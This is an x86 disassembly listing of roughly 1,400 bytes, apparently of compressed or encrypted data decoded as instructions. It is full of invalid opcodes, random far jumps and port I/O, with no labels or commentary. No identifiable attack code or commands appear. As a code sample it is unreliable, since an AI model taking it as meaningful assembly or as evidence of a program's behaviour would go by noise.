  404cb7:	c5 2a                	lds    (%edx),%ebp
  404cb9:	d8 76 23             	fdivs  0x23(%esi)
  404cbc:	40                   	inc    %eax
  404cbd:	f8                   	clc
  404cbe:	1f                   	pop    %ds
  404cbf:	fe                   	(bad)
  404cc0:	6c                   	insb   (%dx),%es:(%edi)
  404cc1:	df c2                	ffreep %st(2)
  404cc3:	2e e1 ff             	loope,pn 0x404cc5
  404cc6:	10 0e                	adc    %cl,(%esi)
  404cc8:	52                   	push   %edx
  404cc9:	5c                   	pop    %esp
  404cca:	a0 0c bf 3b ca       	mov    0xca3bbf0c,%al
  404ccf:	05 59 0f 70 fc       	add    $0xfc700f59,%eax
  404cd4:	9c                   	pushf
  404cd5:	83 a0 6e f3 77 e7 a7 	andl   $0xffffffa7,-0x18880c92(%eax)
  404cdc:	59                   	pop    %ecx
  404cdd:	dd 33                	fnsave (%ebx)
  404cdf:	4c                   	dec    %esp
  404ce0:	6f                   	outsl  %ds:(%esi),(%dx)
  404ce1:	30 bd c5 f4 01 d3    	xor    %bh,-0x2cfe0b3b(%ebp)
  404ce7:	e7 8d                	out    %eax,$0x8d
  404ce9:	76 ec                	jbe    0x404cd7
  404ceb:	7d e3                	jge    0x404cd0
  404ced:	5e                   	pop    %esi
  404cee:	5e                   	pop    %esi
  404cef:	24 49                	and    $0x49,%al
  404cf1:	0c 1a                	or     $0x1a,%al
  404cf3:	f2 78 32             	bnd js 0x404d28
  404cf6:	4a                   	dec    %edx
  404cf7:	0a cb                	or     %bl,%cl
  404cf9:	c8 5a 75 24          	enter  $0x755a,$0x24
  404cfd:	13 55 27             	adc    0x27(%ebp),%edx
  404d00:	59                   	pop    %ecx
  404d01:	8c f2                	mov    %?,%edx
  404d03:	8a 9a 22 79 44 d2    	mov    -0x2dbb86de(%edx),%bl
  404d09:	48                   	dec    %eax
  404d0a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404d0b:	92                   	xchg   %eax,%edx
  404d0c:	46                   	inc    %esi
  404d0d:	71 aa                	jno    0x404cb9
  404d0f:	3a 02                	cmp    (%edx),%al
  404d11:	ed                   	in     (%dx),%eax
  404d12:	28 2f                	sub    %ch,(%edi)
  404d14:	29 54 47 1d          	sub    %edx,0x1d(%edi,%eax,2)
  404d18:	64 9a 06 8f a3 34 d1 	fs lcall $0x90d1,$0x34a38f06
  404d1f:	90 
  404d20:	b5 a5                	mov    $0xa5,%ch
  404d22:	58                   	pop    %eax
  404d23:	cb                   	lret
  404d24:	29 aa 44 15 a2 7a    	sub    %ebp,0x7aa21544(%edx)
  404d2a:	3c a2                	cmp    $0xa2,%al
  404d2c:	2e 4d                	cs dec %ebp
  404d2e:	62 c6 ec b6 a9       	(bad)
  404d33:	2f                   	das
  404d34:	74 e6                	je     0x404d1c
  404d36:	2f                   	das
  404d37:	a1 70 5a c9 62       	mov    0x62c95a70,%eax
  404d3c:	55                   	push   %ebp
  404d3d:	ca e1 33             	lret   $0x33e1
  404d40:	1e                   	push   %ds
  404d41:	cf                   	iret
  404d42:	78 06                	js     0x404d4a
  404d44:	6b 56 bc 33          	imul   $0x33,-0x44(%esi),%edx
  404d48:	ef                   	out    %eax,(%dx)
  404d49:	b6 c8                	mov    $0xc8,%dh
  404d4b:	4a                   	dec    %edx
  404d4c:	24 15                	and    $0x15,%al
  404d4e:	fe                   	(bad)
  404d4f:	5a                   	pop    %edx
  404d50:	a2 ca 11 37 2e       	mov    %al,0x2e3711ca
  404d55:	60                   	pusha
  404d56:	d9 a0 52 92 55 66    	fldenv 0x66559252(%eax)
  404d5c:	f9                   	stc
  404d5d:	90                   	nop
  404d5e:	e5 84                	in     $0x84,%eax
  404d60:	b8 a6 11 2d 84       	mov    $0x842d11a6,%eax
  404d65:	fa                   	cli
  404d66:	55                   	push   %ebp
  404d67:	99                   	cltd
  404d68:	68 1a 96 29 32       	push   $0x3229961a
  404d6d:	ac                   	lods   %ds:(%esi),%al
  404d6e:	6b 01 66             	imul   $0x66,(%ecx),%eax
  404d71:	3f                   	aas
  404d72:	8c 8d 8a e7 bb 3e    	mov    %cs,0x3ebbe78a(%ebp)
  404d78:	76 7d                	jbe    0x404df7
  404d7a:	5d                   	pop    %ebp
  404d7b:	45                   	inc    %ebp
  404d7c:	66 a0 c9 df 0d 0b    	data16 mov 0xb0ddfc9,%al
  404d82:	6f                   	outsl  %ds:(%esi),(%dx)
  404d83:	66 42                	inc    %dx
  404d85:	6d                   	insl   (%dx),%es:(%edi)
  404d86:	c6 c1 d5             	mov    $0xd5,%cl
  404d89:	b6 6d                	mov    $0x6d,%dh
  404d8b:	e7 52                	out    %eax,$0x52
  404d8d:	3f                   	aas
  404d8e:	cc                   	int3
  404d8f:	47                   	inc    %edi
  404d90:	b9 68 e8 19 3d       	mov    $0x3d19e868,%ecx
  404d95:	30 57 34             	xor    %dl,0x34(%edi)
  404d98:	76 b7                	jbe    0x404d51
  404d9a:	9b                   	fwait
  404d9b:	67 42                	addr16 inc %edx
  404d9d:	40                   	inc    %eax
  404d9e:	9b                   	fwait
  404d9f:	2c d7                	sub    $0xd7,%al
  404da1:	5c                   	pop    %esp
  404da2:	91                   	xchg   %eax,%ecx
  404da3:	7a c3                	jp     0x404d68
  404da5:	88 ee                	mov    %ch,%dh
  404da7:	86 dd                	xchg   %bl,%ch
  404da9:	74 87                	je     0x404d32
  404dab:	85 9a c5 cc 16 3b    	test   %ebx,0x3b16ccc5(%edx)
  404db1:	9a e9 60 8b 68 06 5a 	lcall  $0x5a06,$0x688b60e9
  404db8:	6c                   	insb   (%dx),%es:(%edi)
  404db9:	f0 33 08             	lock xor (%eax),%ecx
  404dbc:	77 1a                	ja     0x404dd8
  404dbe:	47                   	inc    %edi
  404dbf:	d8 01                	fadds  (%ecx)
  404dc1:	2f                   	das
  404dc2:	0a e7                	or     %bh,%ah
  404dc4:	8d                   	lea    (bad),%edi
  404dc5:	fa                   	cli
  404dc6:	99                   	cltd
  404dc7:	2b 0e                	sub    (%esi),%ecx
  404dc9:	64 b8 1e 73 ec 3f    	fs mov $0x3fec731e,%eax
  404dcf:	67 9f                	addr16 lahf
  404dd1:	3a e7                	cmp    %bh,%ah
  404dd3:	1d 8c c5 cf 58       	sbb    $0x58cfc58c,%eax
  404dd8:	ea c2 6e c3 65 b3 1a 	ljmp   $0x1ab3,$0x65c36ec2
  404ddf:	3b e3                	cmp    %ebx,%esp
  404de1:	5d                   	pop    %ebp
  404de2:	c5 87 d6 8c 2e 5d    	lds    0x5d2e8cd6(%edi),%eax
  404de8:	e5 d1                	in     $0xd1,%eax
  404dea:	e7 95                	out    %eax,$0x95
  404dec:	25 81 f7 8f 2c       	and    $0x2c8ff781,%eax
  404df1:	c5 78 7e             	lds    0x7e(%eax),%edi
  404df4:	58                   	pop    %eax
  404df5:	14 a7                	adc    $0xa7,%al
  404df7:	fc                   	cld
  404df8:	a2 28 26 c4 97       	mov    %al,0x97c42628
  404dfd:	31 be 2f c6 12 18    	xor    %edi,0x1812c62f(%esi)
  404e03:	52                   	push   %edx
  404e04:	8b 29                	mov    (%ecx),%ebp
  404e06:	7d 3d                	jge    0x404e45
  404e08:	cb                   	lret
  404e09:	17                   	pop    %ss
  404e0a:	cc                   	int3
  404e0b:	80 97 5d 76 ad 78 99 	adcb   $0x99,0x78ad765d(%edi)
  404e12:	1e                   	push   %ds
  404e13:	3b fd                	cmp    %ebp,%edi
  404e15:	85 fa                	test   %edi,%edx
  404e17:	16                   	push   %ss
  404e18:	04 de                	add    $0xde,%al
  404e1a:	3b 65 8e             	cmp    -0x72(%ebp),%esp
  404e1d:	98                   	cwtl
  404e1e:	01 97 f5 a0 31 de    	add    %edx,-0x21ce5f0b(%edi)
  404e24:	bb 70 aa 8e 59       	mov    $0x598eaa70,%ebx
  404e29:	09 73 63             	or     %esi,0x63(%ebx)
  404e2c:	21 c6                	and    %eax,%esi
  404e2e:	fb                   	sti
  404e2f:	87 cd                	xchg   %ecx,%ebp
  404e31:	8d 6d 97             	lea    -0x69(%ebp),%ebp
  404e34:	19 00                	sbb    %eax,(%eax)
  404e36:	2b b6 55 ae f3 f5    	sub    -0xa0c51ab(%esi),%esi
  404e3c:	b2 2d                	mov    $0x2d,%dl
  404e3e:	42                   	inc    %edx
  404e3f:	4d                   	dec    %ebp
  404e40:	cf                   	iret
  404e41:	37                   	aaa
  404e42:	1a ed                	sbb    %ch,%ch
  404e44:	99                   	cltd
  404e45:	ca d4 f8             	lret   $0xf8d4
  404e48:	3e 31 bb a5 76 f0 f7 	xor    %edi,%ds:-0x80f895b(%ebx)
  404e4f:	39 4b 13             	cmp    %ecx,0x13(%ebx)
  404e52:	5c                   	pop    %esp
  404e53:	2f                   	das
  404e54:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404e55:	82 a4 d3 52 43 00 4e 	andb   $0x40,0x4e004352(%ebx,%edx,8)
  404e5c:	40 
  404e5d:	4f                   	dec    %edi
  404e5e:	96                   	xchg   %eax,%esi
  404e5f:	e8 b8 4f 52 53       	call   0x53929e1c
  404e64:	59                   	pop    %ecx
  404e65:	0c d8                	or     $0xd8,%al
  404e67:	39 ce                	cmp    %ecx,%esi
  404e69:	5a                   	pop    %edx
  404e6a:	7c 96                	jl     0x404e02
  404e6c:	68 a3 8a 3a 99       	push   $0x993a8aa3
  404e71:	c5 43 c9             	lds    -0x37(%ebx),%eax
  404e74:	29 d6                	sub    %edx,%esi
  404e76:	2a b8 08 3d 1a 96    	sub    -0x69e5c2f8(%eax),%bh
  404e7c:	28 1e                	sub    %bl,(%esi)
  404e7e:	d6                   	salc
  404e7f:	88 8c 75 3d 02 b0 02 	mov    %cl,0x2b0023d(%ebp,%esi,2)
  404e86:	f1                   	int1
  404e87:	82 42 cb 7b          	addb   $0x7b,-0x35(%edx)
  404e8b:	f8                   	clc
  404e8c:	06                   	push   %es
  404e8d:	8c b3 87 e4 72 8c    	mov    %?,-0x738d1b79(%ebx)
  404e93:	44                   	inc    %esp
  404e94:	50                   	push   %eax
  404e95:	54                   	push   %esp
  404e96:	1c 81                	sbb    $0x81,%al
  404e98:	73 f1                	jae    0x404e8b
  404e9a:	c4 60 5c             	les    0x5c(%eax),%esp
  404e9d:	e8 3a 19 4c 65       	call   0x658c67dc
  404ea2:	b3 00                	mov    $0x0,%bl
  404ea4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ea5:	b9 01 96 c6 da       	mov    $0xdac69601,%ecx
  404eaa:	1d 25 85 08 88       	sbb    $0x88088525,%eax
  404eaf:	a3 f1 44 25 f2       	mov    %eax,0xf22544f1
  404eb4:	5f                   	pop    %edi
  404eb5:	7e 00                	jle    0x404eb7
  404eb7:	80 9d 85 c6 00 06 00 	sbbb   $0x0,0x600c685(%ebp)
  404ebe:	00 00                	add    %al,(%eax)
  404ec0:	28 0a                	sub    %cl,(%edx)
  404ec2:	00 00                	add    %al,(%eax)
  404ec4:	26 8a 20             	mov    %es:(%eax),%ah
  404ec7:	17                   	pop    %ss
  404ec8:	c3                   	ret
  404ec9:	8c c3                	mov    %es,%ebx
  404ecb:	86 08                	xchg   %cl,(%eax)
  404ecd:	72 53                	jb     0x404f22
  404ecf:	80 f0 58             	xor    $0x58,%al
  404ed2:	73 bb                	jae    0x404e8f
  404ed4:	08 72 53             	or     %dh,0x53(%edx)
  404ed7:	ae                   	scas   %es:(%edi),%al
  404ed8:	99                   	cltd
  404ed9:	62 9c 78 2b fe 75 27 	bound  %ebx,0x2775fe2b(%eax,%edi,2)
  404ee0:	68 bc 78 f7 70       	push   $0x70f778bc
  404ee5:	f9                   	stc
  404ee6:	7c 90                	jl     0x404e78
  404ee8:	7f 1d                	jg     0x404f07
  404eea:	55                   	push   %ebp
  404eeb:	7d 4e                	jge    0x404f3b
  404eed:	aa                   	stos   %al,%es:(%edi)
  404eee:	b1 23                	mov    $0x23,%cl
  404ef0:	fc                   	cld
  404ef1:	69 cf 19 3f 8e 24    	imul   $0x248e3f19,%edi,%ecx
  404ef7:	f7 f0                	div    %eax
  404ef9:	e2 22                	loop   0x404f1d
  404efb:	78 5b                	js     0x404f58
  404efd:	45                   	inc    %ebp
  404efe:	ca 3d db             	lret   $0xdb3d
  404f01:	27                   	daa
  404f02:	30 35 d4 e0 80 83    	xor    %dh,0x8380e0d4
  404f08:	6d                   	insl   (%dx),%es:(%edi)
  404f09:	0f 08                	invd
  404f0b:	7c aa                	jl     0x404eb7
  404f0d:	88 ee                	mov    %ch,%dh
  404f0f:	08 72 53             	or     %dh,0x53(%edx)
  404f12:	37                   	aaa
  404f13:	fc                   	cld
  404f14:	d0 f5                	shl    $1,%ch
  404f16:	1a a7 33 0b c0 fd    	sbb    -0x23ff4cd(%edi),%ah
  404f1c:	a1 9b 69 82 ed       	mov    0xed82699b,%eax
  404f21:	e0 91                	loopne 0x404eb4
  404f23:	4e                   	dec    %esi
  404f24:	f8                   	clc
  404f25:	27                   	daa
  404f26:	5d                   	pop    %ebp
  404f27:	e8 f4 3b 0f ba       	call   0xba4f8b20
  404f2c:	16                   	push   %ss
  404f2d:	0a 99 ed 7f 16 dd    	or     -0x22e98013(%ecx),%bl
  404f33:	b2 7f                	mov    $0x7f,%dl
  404f35:	f7 46 98 cd 3b ae 83 	testl  $0x83ae3bcd,-0x68(%esi)
  404f3c:	4e                   	dec    %esi
  404f3d:	13 b3 f6 08 72 53    	adc    0x537208f6(%ebx),%esi
  404f43:	5f                   	pop    %edi
  404f44:	87 1d 50 ba 4f 3c    	xchg   %ebx,0x3c4fba50
  404f4a:	bb f9 df bb a5       	mov    $0xa5bbdff9,%ebx
  404f4f:	77 14                	ja     0x404f65
  404f51:	bb 7a 2a 08 72       	mov    $0x72082a7a,%ebx
  404f56:	53                   	push   %ebx
  404f57:	2f                   	das
  404f58:	34 24                	xor    $0x24,%al
  404f5a:	fe 85 d2 3b 82 45    	incb   0x45823bd2(%ebp)
  404f60:	f6 20                	mulb   (%eax)
  404f62:	45                   	inc    %ebp
  404f63:	70 ae                	jo     0x404f13
  404f65:	b7 8c                	mov    $0x8c,%bh
  404f67:	85 d3                	test   %edx,%ebx
  404f69:	88 4e 44             	mov    %cl,0x44(%esi)
  404f6c:	34 10                	xor    $0x10,%al
  404f6e:	8d                   	lea    (bad),%edi
  404f6f:	fe                   	(bad)
  404f70:	3a c7                	cmp    %bh,%al
  404f72:	17                   	pop    %ss
  404f73:	9c                   	pushf
  404f74:	8f                   	(bad)
  404f75:	b5 66                	mov    $0x66,%ch
  404f77:	ab                   	stos   %eax,%es:(%edi)
  404f78:	35 c2 59 c6 91       	xor    $0x91c659c2,%eax
  404f7d:	01 0f                	add    %ecx,(%edi)
  404f7f:	31 08                	xor    %ecx,(%eax)
  404f81:	72 53                	jb     0x404fd6
  404f83:	0b f4                	or     %esp,%esi
  404f85:	6c                   	insb   (%dx),%es:(%edi)
  404f86:	e2 80                	loop   0x404f08
  404f88:	78 84                	js     0x404f0e
  404f8a:	ea 37 88 ba 66 61 41 	ljmp   $0x4161,$0x66ba8837
  404f91:	08 72 53             	or     %dh,0x53(%edx)
  404f94:	69 16 5f 9f 21 ce    	imul   $0xce219f5f,(%esi),%edx
  404f9a:	02 d5                	add    %ch,%dl
  404f9c:	16                   	push   %ss
  404f9d:	67 30 87 d5 69       	xor    %al,0x69d5(%bx)
  404fa2:	5b                   	pop    %ebx
  404fa3:	08 72 53             	or     %dh,0x53(%edx)
  404fa6:	4e                   	dec    %esi
  404fa7:	ec                   	in     (%dx),%al
  404fa8:	5e                   	pop    %esi
  404fa9:	2b d3                	sub    %ebx,%edx
  404fab:	c7                   	(bad)
  404fac:	6b 08 72             	imul   $0x72,(%eax),%ecx
  404faf:	53                   	push   %ebx
  404fb0:	89 8a af b7 a0 aa    	mov    %ecx,-0x555f4851(%edx)
  404fb6:	ad                   	lods   %ds:(%esi),%eax
  404fb7:	18 f8                	sbb    %bh,%al
  404fb9:	70 2b                	jo     0x404fe6
  404fbb:	8f                   	(bad)
  404fbc:	5d                   	pop    %ebp
  404fbd:	0c 57                	or     $0x57,%al
  404fbf:	71 70                	jno    0x405031
  404fc1:	08 72 53             	or     %dh,0x53(%edx)
  404fc4:	83 80 84 37 f1 0a 28 	addl   $0x28,0xaf13784(%eax)
  404fcb:	9f                   	lahf
  404fcc:	58                   	pop    %eax
  404fcd:	01 71 67             	add    %esi,0x67(%ecx)
  404fd0:	b4 82                	mov    $0x82,%ah
  404fd2:	09 72 53             	or     %esi,0x53(%edx)
  404fd5:	ed                   	in     (%dx),%eax
  404fd6:	41                   	inc    %ecx
  404fd7:	f8                   	clc
  404fd8:	38 9a e6 99 ab f5    	cmp    %bl,-0xa54661a(%edx)
  404fde:	e8 e9 f6 82 74       	call   0x74c346cc
  404fe3:	be 09 72 53 73       	mov    $0x73537209,%esi
  404fe8:	b4 8b                	mov    $0x8b,%ah
  404fea:	db 78 88             	fstpt  -0x78(%eax)
  404fed:	53                   	push   %ebx
  404fee:	6b 22 d7             	imul   $0xffffffd7,(%edx),%esp
  404ff1:	e6 8e                	out    %al,$0x8e
  404ff3:	25 9f dc 9d 9f       	and    $0x9f9ddc9f,%eax
  404ff8:	90                   	nop
  404ff9:	7c 24                	jl     0x40501f
  404ffb:	f0 07                	lock pop %es
  404ffd:	8d 04 02             	lea    (%edx,%eax,1),%eax
  405000:	38 09                	cmp    %cl,(%ecx)
  405002:	14 5c                	adc    $0x5c,%al
  405004:	c6                   	(bad)
  405005:	ea cf 0e 56 8a ed e7 	ljmp   $0xe7ed,$0x8a560ecf
  40500c:	09 72 53             	or     %esi,0x53(%edx)
  40500f:	45                   	inc    %ebp
  405010:	42                   	inc    %edx
  405011:	94                   	xchg   %eax,%esp
  405012:	6f                   	outsl  %ds:(%esi),(%dx)
  405013:	9b                   	fwait
  405014:	7c cf                	jl     0x404fe5
  405016:	59                   	pop    %ecx
  405017:	71 da                	jno    0x404ff3
  405019:	1e                   	push   %ds
  40501a:	65 24 13             	gs and $0x13,%al
  40501d:	79 81                	jns    0x404fa0
  40501f:	8c 19                	mov    %ds,(%ecx)
  405021:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405022:	9c                   	pushf
  405023:	9a 40 58 2a 10 f6 df 	lcall  $0xdff6,$0x102a5840
  40502a:	a9 8a a6 06 d1       	test   $0xd106a68a,%eax
  40502f:	e4 af                	in     $0xaf,%al
  405031:	3e fb                	ds sti
  405033:	0a 72 13             	or     0x13(%edx),%dh
  405036:	99                   	cltd
  405037:	c5 5d c1             	lds    -0x3f(%ebp),%ebx
  40503a:	52                   	push   %edx
  40503b:	24 b5                	and    $0xb5,%al
  40503d:	27                   	daa
  40503e:	86 68 1d             	xchg   %ch,0x1d(%eax)
  405041:	1d 4e 9f 0a e3       	sbb    $0xe30a9f4e,%eax
  405046:	2f                   	das
  405047:	9a 7b a3 2c 41 df 49 	lcall  $0x49df,$0x412ca37b
  40504e:	ed                   	in     (%dx),%eax
  40504f:	65 e9 1b b1 e8 1e    	gs jmp 0x1f290170
  405055:	59                   	pop    %ecx
  405056:	0f 3b                	(bad)
  405058:	ed                   	in     (%dx),%eax
  405059:	b0 59                	mov    $0x59,%al
  40505b:	6d                   	insl   (%dx),%es:(%edi)
  40505c:	26 95                	es xchg %eax,%ebp
  40505e:	40                   	inc    %eax
  40505f:	a0 a7 86 62 b8       	mov    0xb86286a7,%al
  405064:	2e 2f                	cs das
  405066:	71 1c                	jno    0x405084
  405068:	e9 51 8c be c8       	jmp    0xc8fedcbe
  40506d:	09 71 3c             	or     %esi,0x3c(%ecx)
  405070:	f4                   	hlt
  405071:	47                   	inc    %edi
  405072:	f1                   	int1
  405073:	0f ea 50 9d          	pminsw -0x63(%eax),%mm2
  405077:	3a 78 23             	cmp    0x23(%eax),%bh
  40507a:	5c                   	pop    %esp
  40507b:	24 e1                	and    $0xe1,%al
  40507d:	dc f3                	fdiv   %st,%st(3)
  40507f:	c4 56 50             	les    0x50(%esi),%edx
  405082:	3d 9c 3a 6e 11       	cmp    $0x116e3a9c,%eax
  405087:	5f                   	pop    %edi
  405088:	2c 78                	sub    $0x78,%al
  40508a:	52                   	push   %edx
  40508b:	27                   	daa
  40508c:	d8 ac 39 3a e2 4c 7c 	fsubrs 0x7c4ce23a(%ecx,%edi,1)
  405093:	15 5e 39 6c b5       	adc    $0xb56c395e,%eax
  405098:	f8                   	clc
  405099:	30 ea                	xor    %ch,%dl
  40509b:	89 c4                	mov    %eax,%esp
  40509d:	bd c3 41 87 aa       	mov    $0xaa8741c3,%ebp
  4050a2:	05 56 7b 79 4e       	add    $0x4e797b56,%eax
  4050a7:	c4 78 50             	les    0x50(%eax),%edi
  4050aa:	7c 32                	jl     0x4050de
  4050ac:	ba dc 61 74 db       	mov    $0xdb7461dc,%edx
  4050b1:	e7 5a                	out    %eax,$0x5a
  4050b3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4050b4:	8f                   	(bad)
  4050b5:	be 00 53 01 b8       	mov    $0xb8015300,%esi
  4050ba:	54                   	push   %esp
  4050bb:	ff 50 a3             	call   *-0x5d(%eax)
  4050be:	71 d5                	jno    0x405095
  4050c0:	b2 bf                	mov    $0xbf,%dl
  4050c2:	29 29                	sub    %ebp,(%ecx)
  4050c4:	3f                   	aas
  4050c5:	62 3e                	bound  %edi,(%esi)
  4050c7:	3f                   	aas
  4050c8:	b1 ec                	mov    $0xec,%cl
  4050ca:	9b                   	fwait
  4050cb:	74 41                	je     0x40510e
  4050cd:	42                   	inc    %edx
  4050ce:	e0 ea                	loopne 0x4050ba
  4050d0:	54                   	push   %esp
  4050d1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4050d2:	0b 7d 73             	or     0x73(%ebp),%edi
  4050d5:	35 6b 18 e8 ee       	xor    $0xeee8186b,%eax
  4050da:	06                   	push   %es
  4050db:	b9 a2 e3 f9 72       	mov    $0x72f9e3a2,%ecx
  4050e0:	7b 84                	jnp    0x405066
  4050e2:	08 7e be             	or     %bh,-0x42(%esi)
  4050e5:	06                   	push   %es
  4050e6:	47                   	inc    %edi
  4050e7:	25 db 03 bb 6a       	and    $0x6abb03db,%eax
  4050ec:	15 dd 81 32 aa       	adc    $0xaa3281dd,%eax
  4050f1:	af                   	scas   %es:(%edi),%eax
  4050f2:	6b af 6c 80 b3 37 58 	imul   $0x58,0x37b3806c(%edi),%ebp
  4050f9:	82 13 8b             	adcb   $0x8b,(%ebx)
  4050fc:	2a 1b                	sub    (%ebx),%bl
  4050fe:	95                   	xchg   %eax,%ebp
  4050ff:	c3                   	ret
  405100:	ed                   	in     (%dx),%eax
  405101:	6c                   	insb   (%dx),%es:(%edi)
  405102:	56                   	push   %esi
  405103:	44                   	inc    %esp
  405104:	19 fa                	sbb    %edi,%edx
  405106:	3f                   	aas
  405107:	93                   	xchg   %eax,%ebx
  405108:	11 0d 49 d6 4e 4e    	adc    %ecx,0x4e4ed649
  40510e:	12 31                	adc    (%ecx),%dh
  405110:	a3 c7 bc 38 0c       	mov    %eax,0xc38bcc7
  405115:	ac                   	lods   %ds:(%esi),%al
  405116:	0f 45 e7             	cmovne %edi,%esp
  405119:	f4                   	hlt
  40511a:	0c 0d                	or     $0xd,%al
  40511c:	77 be                	ja     0x4050dc
  40511e:	6f                   	outsl  %ds:(%esi),(%dx)
  40511f:	11 e7                	adc    %esp,%edi
  405121:	71 d1                	jno    0x4050f4
  405123:	31 08                	xor    %ecx,(%eax)
  405125:	33 a2 20 5c 67 0e    	xor    0xe675c20(%edx),%esp
  40512b:	e0 81                	loopne 0x4050ae
  40512d:	39 29                	cmp    %ebp,(%ecx)
  40512f:	c8 e0 f4 37          	enter  $0xf4e0,$0x37
  405133:	24 c5                	and    $0xc5,%al
  405135:	b2 ad                	mov    $0xad,%dl
  405137:	5f                   	pop    %edi
  405138:	54                   	push   %esp
  405139:	52                   	push   %edx
  40513a:	d5 90                	aad    $0x90
  40513c:	c1 ae ed 7a 7a 52 6b 	shrl   $0x6b,0x527a7aed(%esi)
  405143:	81 18 92 ef 6a b8    	sbbl   $0xb86aef92,(%eax)
  405149:	c5 a4 39 fa c0 a8 2c 	lds    0x2ca8c0fa(%ecx,%edi,1),%esp
  405150:	b5 4e                	mov    $0x4e,%ch
  405152:	ca c1 cd             	lret   $0xcdc1
  405155:	c6                   	(bad)
  405156:	2a 67 46             	sub    0x46(%edi),%ah
  405159:	43                   	inc    %ebx
  40515a:	e0 19                	loopne 0x405175
  40515c:	92                   	xchg   %eax,%edx
  40515d:	d2 6e 78             	shrb   %cl,0x78(%esi)
  405160:	de 78 97             	fidivrs -0x69(%eax)
  405163:	e0 61                	loopne 0x4051c6
  405165:	b1 4a                	mov    $0x4a,%cl
  405167:	8e d9                	mov    %ecx,%ds
  405169:	c9                   	leave
  40516a:	14 a0                	adc    $0xa0,%al
  40516c:	b4 c6                	mov    $0xc6,%ah
  40516e:	96                   	xchg   %eax,%esi
  40516f:	84 67 8d             	test   %ah,-0x73(%edi)
  405172:	b5 40                	mov    $0x40,%ch
  405174:	cb                   	lret
  405175:	4c                   	dec    %esp
  405176:	91                   	xchg   %eax,%ecx
  405177:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405178:	fd                   	std
  405179:	14 70                	adc    $0x70,%al
  40517b:	37                   	aaa
  40517c:	b3 61                	mov    $0x61,%bl
  40517e:	71 01                	jno    0x405181
  405180:	de b5 a6 0b 5a f2    	fidivs -0xda5f45a(%ebp)
  405186:	fc                   	cld
  405187:	1c bb                	sbb    $0xbb,%al
  405189:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40518a:	ff 70 17             	push   0x17(%eax)
  40518d:	6f                   	outsl  %ds:(%esi),(%dx)
  40518e:	fb                   	sti
  40518f:	29 18                	sub    %ebx,(%eax)
  405191:	8c 3d 69 67 09 8c    	mov    %?,0x8c096769
  405197:	82 97 3b 9d 76 4b ba 	adcb   $0xba,0x4b769d3b(%edi)
  40519e:	52                   	push   %edx
  40519f:	8e df                	mov    %edi,%ds
  4051a1:	c2 0e 36             	ret    $0x360e
  4051a4:	9f                   	lahf
  4051a5:	09 8e da 10 39 dc    	or     %ecx,-0x23c6ef26(%esi)
  4051ab:	d2 32                	shlb   %cl,(%edx)
  4051ad:	92                   	xchg   %eax,%edx
  4051ae:	37                   	aaa
  4051af:	a1 a5 15 a0 0c       	mov    0xca015a5,%eax
  4051b4:	7c fe                	jl     0x4051b4
  4051b6:	77 b8                	ja     0x405170
  4051b8:	b9 88 09 ba 30       	mov    $0x30ba0988,%ecx
  4051bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4051be:	34 91                	xor    $0x91,%al
  4051c0:	9f                   	lahf
  4051c1:	5a                   	pop    %edx
  4051c2:	84 a7 f5 b1 6c 21    	test   %ah,0x216cb1f5(%edi)
  4051c8:	3a d6                	cmp    %dh,%dl
  4051ca:	b2 98                	mov    $0x98,%dl
  4051cc:	c7                   	(bad)
  4051cd:	25 8d 29 5a bd       	and    $0xbd5a298d,%eax
  4051d2:	bb 13 f2 bc b8       	mov    $0xb8bcf213,%ebx
  4051d7:	49                   	dec    %ecx
  4051d8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4051d9:	66 3c b7             	data16 cmp $0xb7,%al
  4051dc:	87 ab d9 43 78 b4    	xchg   %ebp,-0x4b87bc27(%ebx)
  4051e2:	b4 b3                	mov    $0xb3,%ah
  4051e4:	51                   	push   %ecx
  4051e5:	73 91                	jae    0x405178
  4051e7:	74 0d                	je     0x4051f6
  4051e9:	2c 2f                	sub    $0x2f,%al
  4051eb:	f6 fa                	idiv   %dl
  4051ed:	80 08 c4             	orb    $0xc4,(%eax)
  4051f0:	72 c0                	jb     0x4051b2
  4051f2:	be 06 8e 47 42       	mov    $0x42478e06,%esi
  4051f7:	29 66 db             	sub    %esp,-0x25(%esi)
  4051fa:	79 6a                	jns    0x405266
  4051fc:	71 90                	jno    0x40518e
  4051fe:	52                   	push   %edx
  4051ff:	8a e6                	mov    %dh,%ah
  405201:	52                   	push   %edx
  405202:	53                   	push   %ebx
  405203:	32 77 12             	xor    0x12(%edi),%dh
  405206:	41                   	inc    %ecx
  405207:	dc 85 c1 db d9 66    	faddl  0x66d9dbc1(%ebp)
  40520d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40520e:	86 ce                	xchg   %cl,%dh
  405210:	be 59 87 34 b9       	mov    $0xb9348759,%esi
  405215:	eb ed                	jmp    0x405204
  405217:	10 68 a1             	adc    %ch,-0x5f(%eax)
  40521a:	e8 6f db d0 9e       	call   0x9f112d8e
  40521f:	33 cd                	xor    %ebp,%ecx
  405221:	3d e0 f2 c3 aa       	cmp    $0xaac3f2e0,%eax
  405226:	71 d2                	jno    0x4051fa
  405228:	17                   	pop    %ss
  405229:	04 3e                	add    $0x3e,%al
  40522b:	42                   	inc    %edx
  40522c:	c2 9d ca             	ret    $0xca9d
  40522f:	3c a9                	cmp    $0xa9,%al
  405231:	14 2b                	adc    $0x2b,%al
  405233:	e1 3c                	loope  0x405271
  405235:	19 1a                	sbb    %ebx,(%edx)
  405237:	60                   	pusha
  405238:	72 f8                	jb     0x405232
  40523a:	1c 4e                	sbb    $0x4e,%al
  40523c:	68 a1 21 d6 54       	push   $0x54d621a1
  405241:	55                   	push   %ebp
  405242:	d2 64 1f f0          	shlb   %cl,-0x10(%edi,%ebx,1)
  405246:	0e                   	push   %cs
  405247:	7a 3a                	jp     0x405283
  405249:	e0 1b                	loopne 0x405266
  40524b:	50                   	push   %eax
  40524c:	40                   	inc    %eax
  40524d:	65 51                	gs push %ecx
  40524f:	1b bd fd ac f4 f8    	sbb    -0x70b5303(%ebp),%edi
  405255:	2c 85                	sub    $0x85,%al
  405257:	9f                   	lahf
